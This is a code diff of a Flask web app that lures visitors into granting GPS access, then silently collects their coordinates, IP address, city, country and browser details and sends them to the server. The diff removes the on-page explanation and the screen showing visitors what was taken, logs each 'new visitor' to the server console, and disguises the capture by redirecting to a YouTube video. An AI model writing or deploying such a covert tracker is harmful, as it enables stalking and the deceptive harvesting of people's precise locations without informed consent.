@@ -2,8 +2,6 @@ from flask import Flask, request, jsonify
 
 app = Flask(__name__)
 
-logs = []
-
 @app.route("/")
 def home():
 
@@ -13,78 +11,69 @@ def home():
     return f"""
     <!DOCTYPE html>
     <html>
-    <head>
-        <title>Permission GPS</title>
-    </head>
     <body style="font-family: Arial; text-align:center; margin-top:50px;">
 
-        <h1>Autoriser la localisation</h1>
-        <p>Ce site souhaite accéder à votre position GPS.</p>
+    <h1>Autoriser la localisation</h1>
 
-        <button onclick="getLocation()"
-        style="padding:15px; font-size:18px;">
-        Autoriser
-        </button>
+    <button onclick="getLocation()"
+    style="padding:15px; font-size:18px;">
+    Autoriser
+    </button>
 
-        <script>
+    <script>
 
-        async function getLocation() {{
+    async function getLocation() {{
 
-            if (!navigator.geolocation) {{
-                alert("GPS non supporté");
-                return;
+        navigator.geolocation.getCurrentPosition(
+
+            async function(position) {{
+
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                let ipInfo =
+                await fetch("https://ipapi.co/json/");
+
+                ipInfo = await ipInfo.json();
+
+                const data = {{
+                    ip: "{ip}",
+                    country: ipInfo.country_name,
+                    city: ipInfo.city,
+                    latitude: latitude,
+                    longitude: longitude,
+                    device: "{user_agent}"
+                }};
+
+                await fetch("/save", {{
+                    method: "POST",
+                    headers: {{
+                        "Content-Type": "application/json"
+                    }},
+                    body: JSON.stringify(data)
+                }});
+
+                document.body.innerHTML =
+                "<h2>Redirection...</h2>";
+
+                setTimeout(() => {{
+                    window.location.href =
+                    "https://www.youtube.com/watch?v=C3lWwBslWqg&list=RDEVLaJtg8xIU&index=8";
+                }}, 2000);
+
+            }},
+
+            function(error) {{
+
+                document.body.innerHTML =
+                "<h2>Permission refusée</h2>";
+
             }}
 
-            navigator.geolocation.getCurrentPosition(
+        );
+    }}
 
-                async function(position) {{
-
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
-
-                    let ipInfo =
-                    await fetch("https://ipapi.co/json/");
-
-                    ipInfo = await ipInfo.json();
-
-                    const data = {{
-                        ip: "{ip}",
-                        country: ipInfo.country_name,
-                        city: ipInfo.city,
-                        region: ipInfo.region,
-                        latitude: latitude,
-                        longitude: longitude,
-                        device: "{user_agent}"
-                    }};
-
-                    await fetch("/save", {{
-                        method: "POST",
-                        headers: {{
-                            "Content-Type": "application/json"
-                        }},
-                        body: JSON.stringify(data)
-                    }});
-
-                    document.body.innerHTML = `
-                        <h2>Informations récupérées</h2>
-
-                        <p><b>IP:</b> ${{data.ip}}</p>
-                        <p><b>Pays:</b> ${{data.country}}</p>
-                        <p><b>Ville:</b> ${{data.city}}</p>
-                        <p><b>Latitude:</b> ${{latitude}}</p>
-                        <p><b>Longitude:</b> ${{longitude}}</p>
-                    `;
-
-                }},
-
-                function(error) {{
-                    alert("Permission refusée");
-                }}
-
-            );
-        }}
-
-        </script>
+    </script>
 
     </body>
     </html>
@@ -94,30 +83,17 @@ def home():
 def save():
 
     data = request.json
-    logs.append(data)
+
+    print("\\n========= NEW VISITOR =========")
+    print("IP:", data["ip"])
+    print("Country:", data["country"])
+    print("City:", data["city"])
+    print("Latitude:", data["latitude"])
+    print("Longitude:", data["longitude"])
+    print("Device:", data["device"])
+    print("================================\\n")
 
     return jsonify({"status": "saved"})
-
-@app.route("/admin")
-def admin():
-
-    html = "<h1>Logs</h1>"
-
-    for item in logs:
-
-        html += f"""
-        <hr>
-
-        <b>IP:</b> {item['ip']}<br>
-        <b>Pays:</b> {item['country']}<br>
-        <b>Ville:</b> {item['city']}<br>
-        <b>Région:</b> {item['region']}<br>
-        <b>Latitude:</b> {item['latitude']}<br>
-        <b>Longitude:</b> {item['longitude']}<br>
-        <b>Device:</b> {item['device']}<br>
-        """
-
-    return html
 
 if __name__ == "__main__":
     app.run()
